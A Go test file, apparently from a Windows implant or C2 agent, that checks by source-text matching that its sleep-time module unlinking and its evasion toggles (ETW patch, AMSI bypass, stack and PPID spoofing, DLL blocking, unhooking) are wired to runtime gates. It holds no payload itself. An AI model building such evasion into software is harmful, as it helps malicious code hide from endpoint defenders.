package app

// 睡眠期模块摘链（P2）与主机层对抗门控（P4）的接线棘轮。
//
// 摘链本身有单测（core/evasion/modhide_windows_test.go），但"睡眠路径到底有没有
// 调它"只能看源码：SleepMask 里少了那两行，功能就静默消失了 —— 没有编译错误，
// 也没有运行期症状，只有实机抓内存模块时才看得出区别。
//
// P4 之后门控拆细了：摘链不再跟随"任一主机层对抗开启"，而是自己的
// SLEEP_MASK_HIDE_PLACEHOLDER_12345。这条棘轮同时钉住两件事 ——
// 调用点用细门控 + 细门控读的是运行期可变的能力状态（EVASION 才能切）。

import (
	"os"
	"strings"
	"testing"
)

func TestSleepMaskHidesModuleDuringSleep(t *testing.T) {
	src, err := os.ReadFile("run.go")
	if err != nil {
		t.Fatalf("读取 run.go 失败: %v", err)
	}
	s := string(src)
	if !strings.Contains(s, "evasion.HideForSleep(config.SleepMaskHideEnabled() && d >= time.Second)") {
		t.Error("run.go 的 SleepMask 没有调用 evasion.HideForSleep（且要求 d>=1s）—— 睡眠期不会摘链")
	}
	if !strings.Contains(s, "defer restoreModule()") {
		t.Error("run.go 缺少 `defer restoreModule()` —— 醒来不挂回会让命令执行路径找不到本模块")
	}
	// 门控必须用细粒度开关：用 HostEvasionEnabled() 会让 ETW patch 顺带打开摘链
	if !strings.Contains(s, "config.SleepMaskHideEnabled()") {
		t.Error("run.go 的摘链没有走 config.SleepMaskHideEnabled() 门控")
	}
	if strings.Contains(s, "evasion.HideForSleep(config.HostEvasionEnabled())") {
		t.Error("run.go 的摘链仍绑在 HostEvasionEnabled() 上 —— 打开了 ETW 就会连带摘链")
	}
}

func TestHostEvasionGateDefaultsOff(t *testing.T) {
	// 本仓文本文件是 CRLF，断言里用 LF 写：统一换行后再比，否则永远匹配不上
	cfg := strings.ReplaceAll(mustRead(t, "../config/config.go"), "\r\n", "\n")

	// 每一项能力都必须经过 EvasionEnabled()：这个函数先看运行期覆盖，再回落编译期
	// 占位符，是 EVASION 命令能生效的唯一入口。直接 return *Compiled() 就等于把
	// 运行期开关短路掉。
	wrappers := []string{
		"func ETWPatchEnabled() bool {\n\treturn EvasionEnabled(EvasionETW)\n}",
		"func AmsiBypassEnabled() bool {\n\treturn EvasionEnabled(EvasionAMSI)\n}",
		"func SleepMaskHideEnabled() bool { return EvasionEnabled(EvasionModHide) }",
		"func StackSpoofEnabled() bool { return EvasionEnabled(EvasionSpoof) }",
		"func PpidSpoofEnabled() bool { return EvasionEnabled(EvasionPPID) }",
		"func BlockDLLsEnabled() bool { return EvasionEnabled(EvasionBlockDLLs) }",
		"func UnhookOnStartEnabled() bool { return EvasionEnabled(EvasionUnhook) }",
	}
	for _, want := range wrappers {
		if !strings.Contains(cfg, want) {
			t.Errorf("门控实现变了，缺少: %s", strings.ReplaceAll(want, "\n", " "))
		}
	}

	// HostEvasionEnabled 只剩"启动期初始化要不要做"的聚合语义
	if !strings.Contains(cfg, "return hostEvasionCompiledAny()") {
		t.Error("HostEvasionEnabled 的实现变了：它应聚合编译期值，只用于 Init 的启动期决策")
	}
}

func mustRead(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("读取 %s 失败: %v", path, err)
	}
	return string(b)
}
